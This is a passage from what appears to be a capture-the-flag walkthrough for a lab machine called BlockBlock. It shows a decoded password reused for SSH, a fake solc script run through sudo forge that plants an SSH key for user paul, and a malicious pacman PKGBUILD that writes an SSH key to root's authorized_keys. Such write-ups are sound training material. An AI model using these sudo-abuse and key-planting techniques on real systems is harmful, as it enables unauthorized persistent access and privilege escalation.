OTE1NzgyOTAwMzYwMWYxNjgyMDE5MTViNTA1MDUwNTA1MDkxNTA4MDgwNTQ2MTA0YzE5MDYxMGYwZDU2NWI4MDYwMWYwMTYwMjA4MDkxMDQwMjYwMjAwMTYwNDA1MTkwODEwMTYwNDA1MjgwOTI5MTkwODE4MTUyNjAyMDAxODI4MDU0NjEwNGVkOTA2MTBmMGQ1NjViODAxNTYxMDUzYTU3ODA2MDFmMTA2MTA1MGY1NzYxMDEwMDgwODM1NDA0MDI4MzUyOTE2MDIwMDE5MTYxMDUzYTU2NWI4MjAxOTE5MDYwMDA1MjYwMjA2MDAwMjA5MDViODE1NDgxNTI5MDYwMDEwMTkwNjAyMDAxODA4MzExNjEwNTFkNTc4MjkwMDM2MDFmMTY4MjAxOTE1YjUwNTA1MDUwNTA5MDUwOTM1MDkzNTA5MzUwNTA5MjUwOTI1MDkyNTY1YjMzNjAwMTYwMDE2MGEwMWIwMzdmMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDE2MTQ2MTA1OTc1NzYwNDA1MTYyNDYxYmNkNjBlNTFiODE1MjYwMDQwMTYxMDE3NTkwNjEwZTczNTY1Yjg1ODU4MDgwNjAxZjAxNjAyMDgwOTEwNDAyNjAyMDAxNjA0MDUxOTA4MTAxNjA0MDUyODA5MzkyOTE5MDgxODE1MjYwMjAwMTgzODM4MDgyODQzNzYwMDA5MjAxOTE5MDkxNTI1MDUwNjA0MDUxNjAwMTkyNTA2MTA1ZGU5MTUwODM5MDYxMGViNDU2NWI5MDgxNTI2MDQwNTE5MDgxOTAwMzYwMjAwMTkwMjA2MDAyMDE1NDYwZmYxNjYxMDYxMDU3NjA0MDUxNjI0NjFiY2Q2MGU1MWI4MTUyNjAwNDAxNjEwMTc1OTA2MTBlZDA1NjViODQ4NDYwNDA1MTYxMDYyMDkyOTE5MDYxMGVmZDU2NWI2MDQwNTE4MDkxMDM5MDIwNjAwMTg4ODg2MDQwNTE2MTA2M2E5MjkxOTA2MTBlZmQ1NjViOTA4MTUyNjA0MDUxOTA4MTkwMDM2MDIwMDE4MTIwNjEwNjUyOTE2MTEwODQ1NjViNjA0MDUxODA5MTAzOTAyMDE0NjEwNjlhNTc2MDQwNTE2MjQ2MWJjZDYwZTUxYjgxNTI2MDIwNjAwNDgyMDE1MjYwMTA2MDI0ODIwMTUyNmYxMjViOWQ5ODViMWE1OTA4MWMxODVjZGNkZGRiZGM5OTYwODIxYjYwNDQ4MjAxNTI2MDY0MDE2MTAxNzU1NjViODI4MjYwMDE4OTg5NjA0MDUxNjEwNmFlOTI5MTkwNjEwZWZkNTY1YjkwODE1MjYwNDA1MTkwODE5MDAzNjAyMDAxOTAyMDkxNjEwNmM5OTE5MDgzNjEwZjk2NTY1YjUwN2ZkMGI0M2IwYjk2MDgzYzk4Y2MwZjAzNzA1NzU4MTJkZTg3ZWU0OGZmMWJkZTMwYmNkNzRmMzUxODQ0M2JjNGY1ODc4NzYwNDA1MTYxMDZmYjkyOTE5MDYxMTA1NTU2NWI2MDQwNTE4MDkxMDM5MGExNTA1MDUwNTA1MDUwNTA1NjViNjAwMDU0NjAwMTYwMDE2MGEwMWIwMzE2MTU2MTA3NjU1NzYwNDA1MTYyNDYxYmNkNjBlNTFiODE1MjYwMjA2MDA0ODIwMTUyNjAxODYwMjQ4MjAxNTI3ZjQzNjg2MTc0MjA2MTY0NjQ3MjY1NzM3MzIwNjE2YzcyNjU2MTY0NzkyMDczNjU3NDAwMDAwMDAwMDAwMDAwMDA2MDQ0ODIwMTUyNjA2NDAxNjEwMTc1NTY1YjYwMDA4MDU0NjAwMTYwMDE2MGEwMWIwMzE5MTY2MDAxNjAwMTYwYTAxYjAzOTI5MDkyMTY5MTkwOTExNzkwNTU1NjViMzM2MDAxNjAwMTYwYTAxYjAzN2YwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTYxNDYxMDdjZjU3NjA0MDUxNjI0NjFiY2Q2MGU1MWI4MTUyNjAwNDAxNjEwMTc1OTA2MTBlNzM1NjViNjAwMTgyODI2MDQwNTE2MTA3ZTE5MjkxOTA2MTBlZmQ1NjViOTA4MTUyNjA0MDUxOTA4MTkwMDM2MDIwMDE5MDIwNjAwMjAxNTQ2MGZmMTY2MTA4MTM1NzYwNDA1MTYyNDYxYmNkNjBlNTFiODE1MjYwMDQwMTYxMDE3NTkwNjEwZWQwNTY1YjYwMDE4MjgyNjA0MDUxNjEwODI1OTI5MTkwNjEwZWZkNTY1YjkwODE1MjYwNDA1MTkwODE5MDAzNjAyMDAxOTAyMDYwMDA2MTA4NDA4MjgyNjEwYWI1NTY1YjYxMDg0ZTYwMDE4MzAxNjAwMDYxMGFiNTU2NWI1MDYwMDIwMTgwNTQ2MGZmMTkxNjkwNTU2MDAwNTQ2MDQwNTE2MzA0ZDBkODdkNjBlMzFiODE1MjYwMDE2MDAxNjBhMDFiMDM5MDkxMTY5MDYzMjY4NmMzZTg5MDYxMDg4YzkwODU5MDg1OTA2MDA0MDE2MTEwNTU1NjViNjAwMDYwNDA1MTgwODMwMzgxNjAwMDg3ODAzYjE1ODAxNTYxMDhhNjU3NjAwMDgwZmQ1YjUwNWFmMTE1ODAxNTYxMDhiYTU3M2Q2MDAwODAzZTNkNjAwMGZkNWI1MDUwNTA1MDdmNjg2MjFmMzIxOThiZTJhYWJkMjg1ZmYxNTdhMzYxODIzNDJlYmM1MThhMGUwNTRjMDhhMTQ2MWFlMGQ4NjQzMTgyODI2MDQwNTE2MTA4ZWY5MjkxOTA2MTEwNTU1NjViNjA0MDUxODA5MTAzOTBhMTUwNTA1NjViMzM2MDAxNjAwMTYwYTAxYjAzN2YwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTYxNDYxMDk0MzU3NjA0MDUxNjI0NjFiY2Q2MGU1MWI4MTUyNjAwNDAxNjEwMTc1OTA2MTBlNzM1NjViNjA0MDgwNTE2MDIwODEwMTgyNTI2MDAwOTA1MjUxN2ZjNWQyNDYwMTg2ZjcyMzNjOTI3ZTdkYjJkY2M3MDNjMGU1MDBiNjUzY2E4MjI3M2I3YmZhZDgwNDVkODVhNDcwOTA2MDAxOTA2MTA5ODI5MDg1OTA2MTBlYjQ1NjViOTA4MTUyNjA0MDUxOTA4MTkwMDM2MDIwMDE4MTIwNjEwOTlhOTE2MTEwODQ1NjViNjA0MDUxODA5MTAzOTAyMDE0NjEwOWVmNTc2MDQwNTE2MjQ2MWJjZDYwZTUxYjgxNTI2MDIwNjAwNDgyMDE1MjYwMTc2MDI0ODIwMTUyN2Y1NTczNjU3MjZlNjE2ZDY1MjA2MTZjNzI2NTYxNjQ3OTIwNjU3ODY5NzM3NDczMDAwMDAwMDAwMDAwMDAwMDAwNjA0NDgyMDE1MjYwNjQwMTYxMDE3NTU2NWI2MDQwNTE4MDYwNjAwMTYwNDA1MjgwODI4MTUyNjAyMDAxNjA0MDUxODA2MDQwMDE2MDQwNTI4MDYwMDQ4MTUyNjAyMDAxNjMzYWI5YjJiOTYwZTExYjgxNTI1MDgxNTI2MDIwMDE2MDAxMTUxNTgxNTI1MDYwMDE4MzYwNDA1MTYxMGEzOTkxOTA2MTBlYjQ1NjViOTA4MTUyNjA0MDUxOTA4MTkwMDM2MDIwMDE5MDIwODE1MTgxOTA2MTBhNTY5MDgyNjExMGY5NTY1YjUwNjAyMDgyMDE1MTYwMDE4MjAxOTA2MTBhNmI5MDgyNjExMGY5NTY1YjUwNjA0MDkxODIwMTUxNjAwMjkxOTA5MTAxODA1NDYwZmYxOTE2OTExNTE1OTE5MDkxMTc5MDU1NTE3ZmRhNGNmN2EzODdhZGQ4NjU5ZTE4NjVhMmUyNTYyNGJiYWNlMjRkZDRiYzAyOTE4ZTU1ZjE1MGIwZTQ2MGVmOTg5MDYxMDhlZjkwODQ5MDYxMTFiNzU2NWI1MDgwNTQ2MTBhYzE5MDYxMGYwZDU2NWI2MDAwODI1NTgwNjAxZjEwNjEwYWQxNTc1MDUwNTY1YjYwMWYwMTYwMjA5MDA0OTA2MDAwNTI2MDIwNjAwMDIwOTA4MTAxOTA2MTBhZWY5MTkwNjEwYWYyNTY1YjUwNTY1YjViODA4MjExMTU2MTBiMDc1NzYwMDA4MTU1NjAwMTAxNjEwYWYzNTY1YjUwOTA1NjViNjAwMDgwODM2MDFmODQwMTEyNjEwYjFkNTc2MDAwODBmZDViNTA4MTM1NjAwMTYwMDE2MDQwMWIwMzgxMTExNTYxMGIzNDU3NjAwMDgwZmQ1YjYwMjA4MzAxOTE1MDgzNjAyMDgyODUwMTAxMTExNTYxMGI0YzU3NjAwMDgwZmQ1YjkyNTA5MjkwNTA1NjViNjAwMDgwNjAwMDgwNjA0MDg1ODcwMzEyMTU2MTBiNjk1NzYwMDA4MGZkNWI4NDM1NjAwMTYwMDE2MDQwMWIwMzgxMTExNTYxMGI3ZjU3NjAwMDgwZmQ1YjYxMGI4Yjg3ODI4ODAxNjEwYjBiNTY1YjkwOTU1MDkzNTA1MDYwMjA4NTAxMzU2MDAxNjAwMTYwNDAxYjAzODExMTE1NjEwYmFhNTc2MDAwODBmZDViNjEwYmI2ODc4Mjg4MDE2MTBiMGI1NjViOTU5ODk0OTc1MDk1NTA1MDUwNTA1NjViNjAwMDgwNjAyMDgzODUwMzEyMTU2MTBiZDU1NzYwMDA4MGZkNWI4MjM1NjAwMTYwMDE2MDQwMWIwMzgxMTExNTYxMGJlYjU3NjAwMDgwZmQ1YjYxMGJmNzg1ODI4NjAxNjEwYjBiNTY1YjkwOTY5MDk1NTA5MzUwNTA1MDUwNTY1YjYwMDA1YjgzODExMDE1NjEwYzFlNTc4MTgxMDE1MTgzODIwMTUyNjAyMDAxNjEwYzA2NTY1YjUwNTA2MDAwOTEwMTUyNTY1YjYwMDA4MTUxODA4NDUyNjEwYzNmODE2MDIwODYwMTYwMjA4NjAxNjEwYzAzNTY1YjYwMWYwMTYwMWYxOTE2OTI5MDkyMDE2MDIwMDE5MjkxNTA1MDU2NWI2MDYwODE1MjYwMDA2MTBjNjY2MDYwODMwMTg2NjEwYzI3NTY1YjgyODEwMzYwMjA4NDAxNTI2MTBjNzg4MTg2NjEwYzI3NTY1YjkwNTA4MjgxMDM2MDQwODQwMTUyNjEwYzhjODE4NTYxMGMyNzU2NWI5Njk1NTA1MDUwNTA1MDUwNTY1YjYwMDA4MDYwMDA4MDYwMDA4MDYwNjA4Nzg5MDMxMjE1NjEwY2FmNTc2MDAwODBmZDViODYzNTYwMDE2MDAxNjA0MDFiMDM4MTExMTU2MTBjYzU1NzYwMDA4MGZkNWI2MTBjZDE4OTgyOGEwMTYxMGIwYjU2NWI5MDk3NTA5NTUwNTA2MDIwODcwMTM1NjAwMTYwMDE2MDQwMWIwMzgxMTExNTYxMGNmMDU3NjAwMDgwZmQ1YjYxMGNmYzg5ODI4YTAxNjEwYjBiNTY1YjkwOTU1MDkzNTA1MDYwNDA4NzAxMzU2MDAxNjAwMTYwNDAxYjAzODExMTE1NjEwZDFiNTc2MDAwODBmZDViNjEwZDI3ODk4MjhhMDE2MTBiMGI1NjViOTc5YTk2OTk1MDk0OTc1MDkyOTU5Mzk0OTI1MDUwNTA1NjViNjAwMDYwMjA4Mjg0MDMxMjE1NjEwZDRiNTc2MDAwODBmZDViODEzNTYwMDE2MDAxNjBhMDFiMDM4MTE2ODExNDYxMGQ2MjU3NjAwMDgwZmQ1YjkzOTI1MDUwNTA1NjViNjM0ZTQ4N2I3MTYwZTAxYjYwMDA1MjYwNDE2MDA0NTI2MDI0NjAwMGZkNWI2MDAwODI2MDFmODMwMTEyNjEwZDkwNTc2MDAwODBmZDViODEzNTYwMDE2MDAxNjA0MDFiMDM4MTExMTU2MTBkYTk1NzYxMGRhOTYxMGQ2OTU2NWI2MDQwNTE2MDFmODIwMTYwMWYxOTkwODExNjYwM2YwMTE2ODEwMTYwMDE2MDAxNjA0MDFiMDM4MTExODI4MjEwMTcxNTYxMGRkNzU3NjEwZGQ3NjEwZDY5NTY1YjYwNDA1MjgxODE1MjgzODIwMTYwMjAwMTg1MTAxNTYxMGRlZjU3NjAwMDgwZmQ1YjgxNjAyMDg1MDE2MDIwODMwMTM3NjAwMDkxODEwMTYwMjAwMTkxOTA5MTUyOTM5MjUwNTA1MDU2NWI2MDAwODA2MDQwODM4NTAzMTIxNTYxMGUxZjU3NjAwMDgwZmQ1YjgyMzU2MDAxNjAwMTYwNDAxYjAzODExMTE1NjEwZTM1NTc2MDAwODBmZDViNjEwZTQxODU4Mjg2MDE2MTBkN2Y1NjViOTI1MDUwNjAyMDgzMDEzNTYwMDE2MDAxNjA0MDFiMDM4MTExMTU2MTBlNWQ1NzYwMDA4MGZkNWI2MTBlNjk4NTgyODYwMTYxMGQ3ZjU2NWI5MTUwNTA5MjUwOTI5MDUwNTY1YjYwMjA4MDgyNTI2MDIxOTA4MjAxNTI3ZjRmNmU2Yzc5MjA2Zjc3NmU2NTcyMjA2MzYxNmUyMDYzNjE2YzZjMjA3NDY4Njk3MzIwNjY3NTZlNjM3NDY5NmY2MDQwODIwMTUyNjAzNzYwZjkxYjYwNjA4MjAxNTI2MDgwMDE5MDU2NWI2MDAwODI1MTYxMGVjNjgxODQ2MDIwODcwMTYxMGMwMzU2NWI5MTkwOTEwMTkyOTE1MDUwNTY1YjYwMjA4MDgyNTI2MDEzOTA4MjAxNTI3MjE1NWNkOTVjODgxOTFiZDk1Y2M4MWI5YmRkMDgxOTVlMWE1Y2RkNjA2YTFiNjA0MDgyMDE1MjYwNjAwMTkwNTY1YjgxODM4MjM3NjAwMDkxMDE5MDgxNTI5MTkwNTA1NjViNjAwMTgxODExYzkwODIxNjgwNjEwZjIxNTc2MDdmODIxNjkxNTA1YjYwMjA4MjEwODEwMzYxMGY0MTU3NjM0ZTQ4N2I3MTYwZTAxYjYwMDA1MjYwMjI2MDA0NTI2MDI0NjAwMGZkNWI1MDkxOTA1MDU2NWI2MDFmODIxMTE1NjEwZjkxNTc4MDYwMDA1MjYwMjA2MDAwMjA2MDFmODQwMTYwMDUxYzgxMDE2MDIwODUxMDE1NjEwZjZlNTc1MDgwNWI2MDFmODQwMTYwMDUxYzgyMDE5MTUwNWI4MTgxMTAxNTYxMGY4ZTU3NjAwMDgxNTU2MDAxMDE2MTBmN2E1NjViNTA1MDViNTA1MDUwNTY1YjYwMDE2MDAxNjA0MDFiMDM4MzExMTU2MTBmYWQ1NzYxMGZhZDYxMGQ2OTU2NWI2MTBmYzE4MzYxMGZiYjgzNTQ2MTBmMGQ1NjViODM2MTBmNDc1NjViNjAwMDYwMWY4NDExNjAwMTgxMTQ2MTBmZjU1NzYwMDA4NTE1NjEwZmRkNTc1MDgzODIwMTM1NWI2MDAwMTk2MDAzODc5MDFiMWMxOTE2NjAwMTg2OTAxYjE3ODM1NTYxMGY4ZTU2NWI2MDAwODM4MTUyNjAyMDkwMjA2MDFmMTk4NjE2OTA4MzViODI4MTEwMTU2MTEwMjY1Nzg2ODUwMTM1ODI1NTYwMjA5NDg1MDE5NDYwMDE5MDkyMDE5MTAxNjExMDA2NTY1YjUwODY4MjEwMTU2MTEwNDM1NzYwMDAxOTYwZjg4ODYwMDMxYjE2MWMxOTg0ODcwMTM1MTY4MTU1NWI1MDUwNjAwMTg1NjAwMTFiMDE4MzU1NTA1MDUwNTA1MDU2NWI2MDIwODE1MjgxNjAyMDgyMDE1MjgxODM2MDQwODMwMTM3NjAwMDgxODMwMTYwNDA5MDgxMDE5MTkwOTE1MjYwMWY5MDkyMDE2MDFmMTkxNjAxMDE5MTkwNTA1NjViNjAwMDgwODM1NDYxMTA5MjgxNjEwZjBkNTY1YjYwMDE4MjE2ODAxNTYxMTBhOTU3NjAwMTgxMTQ2MTEwYmU1NzYxMTBlZTU2NWI2MGZmMTk4MzE2ODY1MjgxMTUxNTgyMDI4NjAxOTM1MDYxMTBlZTU2NWI4NjYwMDA1MjYwMjA2MDAwMjA2MDAwNWI4MzgxMTAxNTYxMTBlNjU3ODE1NDg4ODIwMTUyNjAwMTkwOTEwMTkwNjAyMDAxNjExMGNhNTY1YjUwNTA4MTg2MDE5MzUwNWI1MDkxOTU5NDUwNTA1MDUwNTA1NjViODE1MTYwMDE2MDAxNjA0MDFiMDM4MTExMTU2MTExMTI1NzYxMTExMjYxMGQ2OTU2NWI2MTExMjY4MTYxMTEyMDg0NTQ2MTBmMGQ1NjViODQ2MTBmNDc1NjViNjAyMDYwMWY4MjExNjAwMTgxMTQ2MTExNWE1NzYwMDA4MzE1NjExMTQyNTc1MDg0ODIwMTUxNWI2MDAwMTk2MDAzODU5MDFiMWMxOTE2NjAwMTg0OTAxYjE3ODQ1NTYxMGY4ZTU2NWI2MDAwODQ4MTUyNjAyMDgxMjA2MDFmMTk4NTE2OTE1YjgyODExMDE1NjExMThhNTc4Nzg1MDE1MTgyNTU2MDIwOTQ4NTAxOTQ2MDAxOTA5MjAxOTEwMTYxMTE2YTU2NWI1MDg0ODIxMDE1NjExMWE4NTc4Njg0MDE1MTYwMDAxOTYwMDM4NzkwMWI2MGY4MTYxYzE5MTY4MTU1NWI1MDUwNTA1MDYwMDE5MDgxMWIwMTkwNTU1MDU2NWI2MDIwODE1MjYwMDA2MTBkNjI2MDIwODMwMTg0NjEwYzI3NTZmZWEyNjQ2OTcwNjY3MzU4MjIxMjIwMGMwYmEzNzQ0MjNjYjc0YWIxNGU0MDdhMDdmNTYxZmI0ZTMzYWFkODQxZjA3MDM2ZmFjNjAxZTMyMjkwMGI0NDY0NzM2ZjZjNjM0MzAwMDgxYTAwMzMwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDQwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA4MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDU2YjY1Njk3MjYxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxYTUzNmY2ZDY1NjQ2MTc5NDI2OTc0NDM2ZjY5NmU1NzY5NmM2YzQzNmY2YzZjNjE3MDczNjUwMDAwMDAwMDAwMDA
```

On the bottom of the `output` we found the username `keira` and something what looked like a `password` in `cleartext`.

![](images/2024-11-22_20-21_8545_cyberchef_decryption.png)

| Password                   |
| -------------------------- |
| SomedayBitCoinWillCollapse |

We tried the `password` we found to login as `keira` via `SSH` and it worked!

```c
┌──(kali㉿kali)-[~]
└─$ ssh keira@10.129.231.122
The authenticity of host '10.129.231.122 (10.129.231.122)' can't be established.
ED25519 key fingerprint is SHA256:Yxhk4seV11xMS6Vp0pPoLicen3kJ7RAkXssZiL2/t3c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.231.122' (ED25519) to the list of known hosts.
keira@10.129.231.122's password:
Last login: Mon Nov 18 17:09:05 2024 from 10.10.14.23
[keira@blockblock ~]$
```

## user.txt

We grabbed the `user.txt` and moved on.

```c
[keira@blockblock ~]$ cat user.txt
c53eee23c18487f17cd691f45b7a967d
```

## Enumeration

A quick `enumeration` showed no special `groups` but another `user` called `paul`.

```c
[keira@blockblock ~]$ id
uid=1000(keira) gid=1000(keira) groups=1000(keira)
```

```c
[keira@blockblock ~]$ cat /etc/passwd
root:x:0:0::/root:/usr/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-coredump:x:980:980:systemd Core Dumper:/:/usr/bin/nologin
systemd-network:x:979:979:systemd Network Management:/:/usr/bin/nologin
systemd-oom:x:978:978:systemd Userspace OOM Killer:/:/usr/bin/nologin
systemd-journal-remote:x:977:977:systemd Journal Remote:/:/usr/bin/nologin
systemd-resolve:x:976:976:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:975:975:systemd Time Synchronization:/:/usr/bin/nologin
tss:x:974:974:tss user for tpm2:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
polkitd:x:102:102:User for polkitd:/:/usr/bin/nologin
avahi:x:973:973:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
git:x:972:972:git daemon user:/:/usr/bin/git-shell
keira:x:1000:1000::/home/keira:/bin/bash
paul:x:1001:1001::/home/paul:/bin/bash
dhcpcd:x:971:971:dhcpcd privilege separation:/:/usr/bin/nologin
```

| Username |
| -------- |
| paul     |

The user `keira` also had the ability to execute `forge` within the `context` of `paul` in his `.foundry` folder.

```c
[keira@blockblock ~]$ sudo -l
User keira may run the following commands on blockblock:
    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
```

## Privilege Escalation to paul

### Abusing custom Solidity Compiler

A little bit of research showed a possibility to execute `arbitrary code` by creating a new `project` within `Foundry` and then using a `custom Solidity Compiler (solc)` in the `build process`.

```c
[keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge
Build, test, fuzz, debug and deploy Solidity contracts

Usage: forge <COMMAND>

Commands:
  bind               Generate Rust bindings for smart contracts
  build              Build the project's smart contracts [aliases: b, compile]
  cache              Manage the Foundry cache
  clean              Remove the build artifacts and cache directories [aliases: cl]
  clone              Clone a contract from Etherscan
  completions        Generate shell completions script [aliases: com]
  config             Display the current config [aliases: co]
  coverage           Generate coverage reports
  create             Deploy a smart contract [aliases: c]
  debug              Debugs a single smart contract as a script [aliases: d]
  doc                Generate documentation for the project
  flatten            Flatten a source file and all of its imports into one file [aliases: f]
  fmt                Format Solidity source files
  geiger             Detects usage of unsafe cheat codes in a project and its dependencies
  generate           Generate scaffold files
  generate-fig-spec  Generate Fig autocompletion spec [aliases: fig]
  help               Print this message or the help of the given subcommand(s)
  init               Create a new Forge project
  inspect            Get specialized information about a smart contract [aliases: in]
  install            Install one or multiple dependencies [aliases: i]
  remappings         Get the automatically inferred remappings for the project [aliases: re]
  remove             Remove one or multiple dependencies [aliases: rm]
  script             Run a smart contract as a script, building transactions that can be sent onchain
  selectors          Function selector utilities [aliases: se]
  snapshot           Create a snapshot of each test's gas usage [aliases: s]
  test               Run the project's tests [aliases: t]
  tree               Display a tree visualization of the project's dependency graph [aliases: tr]
  update             Update one or multiple dependencies [aliases: u]
  verify-bytecode    Verify the deployed bytecode against its source [aliases: vb]
  verify-check       Check verification status on Etherscan [aliases: vc]
  verify-contract    Verify smart contracts on Etherscan [aliases: v]

Options:
  -h, --help     Print help
  -V, --version  Print version

Find more information in the book: http://book.getfoundry.sh/reference/forge/forge.html
```

As first step we `initialized` a new `project` within `/tmp`.

```c
[keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge init /tmp/foobar --no-git --offline
Initializing /tmp/foobar...
    Initialized forge project
```

```c
[keira@blockblock foobar]$ ls -la
total 8
drwxr-xr-x 5 paul paul 140 Nov 22 19:21 .
drwxrwxrwt 3 root root  60 Nov 22 19:21 ..
-rw-r--r-- 1 paul paul 170 Nov 22 19:21 foundry.toml
-rw-r--r-- 1 paul paul 980 Nov 22 19:21 README.md
drwxr-xr-x 2 paul paul  60 Nov 22 19:21 script
drwxr-xr-x 2 paul paul  60 Nov 22 19:21 src
drwxr-xr-x 2 paul paul  60 Nov 22 19:21 test
```

Outside of the `project folder` we then created our `malicious solc binary` to write our `SSH Key` to the `authorized_keys` file of `paul`.

```c
[keira@blockblock tmp]$ vi solc
```

```c
[keira@blockblock foobar]$ cat ../solc
#!/bin/bash
if [[ $1 == "--version" ]]; then
    echo "solc, the solidity compiler"
    echo "Version: 0.8.17+commit.8df45f5f.Linux.g++"
else
    mkdir -p /home/paul/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLe30SIt4ehPSdr4JIuZdQRoWmPo3p6txvjK9OcYC9wTvyDeI2emq63QE+YkqatnXJfLJhgEPXRzXltVrO6KGE3PMoyarwHC6NvDx9Fsjl2oSs0/XqUuSz+nkXWmjUgqP4I7SQar7n6lPBwQBUqnQvhrAZQYlDs4ibsiho0c+VnjJu385eSl8AshVZzf/mMkgvMcs2+NLGpbxbsaErLkBikKNA2OdN03SNLcdReIyLYaYMO2c6IJxK3TnPKvugiZIObYR5Wnvi8ZacqR4DqdfGu4PO8Mw+lyqKRRQNLB5rCK1R47HnRvpnTniR+RA9lT5zh+Wt1F6IBJYow7+zUQqk2+KEMF3Bi4QfYy2nBN7tq7dQMUC5kwOuF7JEnzbBCFAQuLy4TMzVa7LMO6tM+sKHWa9oXt2elvqo5kf4OJL4t2Q04797+3T2tdxDBptLTHG9YtLX+nMWTMIZAE4ia8m/4CJblFmoq2V9F01JeI6cphikXjLk+8yms3QQnPRGJZWo1bFcFvVpyvffhjxYoumWIryOkWs4Hajo+IfOiVrHtpzGSsOUw475yPTG9K6Y1NIxegv62HfzK3+jpMmSrz7wU6qDtEh724XQqaG2NWum3EcrZMJokb8YBeH8SLJtczcfMo4AWB5NXncpZC4+JFu+aT4QY7xrFANsDcNUbsPmqw==" >> /home/paul/.ssh/authorized_keys
    chmod 700 /home/paul/.ssh
    chmod 600 /home/paul/.ssh/authorized_keys
fi
```

Then we set the correct `permissions` on the file and switched back to the `project folder` to start the `build process`.

```c
[keira@blockblock tmp]$ chmod 777 solc
```

```c
[keira@blockblock foobar]$ sudo -u paul /home/paul/.foundry/bin/forge build --use ../solc
[⠊] Compiling...
[⠒] Unable to resolve imports:
      "forge-std/Script.sol" in "/tmp/foobar/script/Counter.s.sol"
      "forge-std/Test.sol" in "/tmp/foobar/test/Counter.t.sol"
with remappings:
      
[⠢] Compiling 3 files with Solc 0.8.17
Error: 
EOF while parsing a value at line 1 column 0
```

And after it finished `compiling` we were able to login as `paul` on the box.

```c
┌──(kali㉿kali)-[~]
└─$ ssh paul@10.129.231.122
[paul@blockblock ~]$ 
```

## Pivoting

While we repeated the same procedure for `paul` as we did for `keira`, it showed another potential `sudo permission abuse` using `pacman`.

```c
[paul@blockblock ~]$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```

```c
[paul@blockblock ~]$ sudo -l
User paul may run the following commands on blockblock:
    (ALL : ALL) NOPASSWD: /usr/bin/pacman
```

## Privilege Escalation to root

### Abusing pacman Packages

We `re-used` the `SSH Key` from before and created a `maclicious package` which then we wanted to `pack` and to `install` using `pacman`.

```c
[paul@blockblock shm]$ cat PKGBUILD 
pkgname=malicious_pkg
pkgver=1.0
pkgrel=1
pkgdesc="Malicious package for privilege escalation"
arch=('x86_64')
url="https://example.com"
license=('GPL')
depends=()
source=()
md5sums=()

package() {
    # Malicious command executed as root
    mkdir -p "${pkgdir}/root/.ssh"
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLe30SIt4ehPSdr4JIuZdQRoWmPo3p6txvjK9OcYC9wTvyDeI2emq63QE+YkqatnXJfLJhgEPXRzXltVrO6KGE3PMoyarwHC6NvDx9Fsjl2oSs0/XqUuSz+nkXWmjUgqP4I7SQar7n6lPBwQBUqnQvhrAZQYlDs4ibsiho0c+VnjJu385eSl8AshVZzf/mMkgvMcs2+NLGpbxbsaErLkBikKNA2OdN03SNLcdReIyLYaYMO2c6IJxK3TnPKvugiZIObYR5Wnvi8ZacqR4DqdfGu4PO8Mw+lyqKRRQNLB5rCK1R47HnRvpnTniR+RA9lT5zh+Wt1F6IBJYow7+zUQqk2+KEMF3Bi4QfYy2nBN7tq7dQMUC5kwOuF7JEnzbBCFAQuLy4TMzVa7LMO6tM+sKHWa9oXt2elvqo5kf4OJL4t2Q04797+3T2tdxDBptLTHG9YtLX+nMWTMIZAE4ia8m/4CJblFmoq2V9F01JeI6cphikXjLk+8yms3QQnPRGJZWo1bFcFvVpyvffhjxYoumWIryOkWs4Hajo+IfOiVrHtpzGSsOUw475yPTG9K6Y1NIxegv62HfzK3+jpMmSrz7wU6qDtEh724XQqaG2NWum3EcrZMJokb8YBeH8SLJtczcfMo4AWB5NXncpZC4+JFu+aT4QY7xrFANsDcNUbsPmqw==" > "${pkgdir}/root/.ssh/authorized_keys"
    chmod 700 "${pkgdir}/root/.ssh"
    chmod 600 "${pkgdir}/root/.ssh/authorized_keys"
}
```

After creating the `PKGBUILD` file we set the required `permissions` on it and used `makepkg` to create the `package`.

```c
[paul@blockblock shm]$ chmod 644 PKGBUILD
```

```c
[paul@blockblock shm]$ makepkg --force --noextract --nodeps
==> Making package: malicious_pkg 1.0-1 (Fri 22 Nov 2024 08:35:22 PM UTC)
==> WARNING: Skipping dependency checks.
==> WARNING: Using existing $srcdir/ tree
==> Entering fakeroot environment...
==> Starting package()...
==> Tidying install...
  -> Removing libtool files...
  -> Purging unwanted files...
  -> Removing static library files...
  -> Stripping unneeded symbols from binaries and libraries...
  -> Compressing man and info pages...
==> Checking for packaging issues...
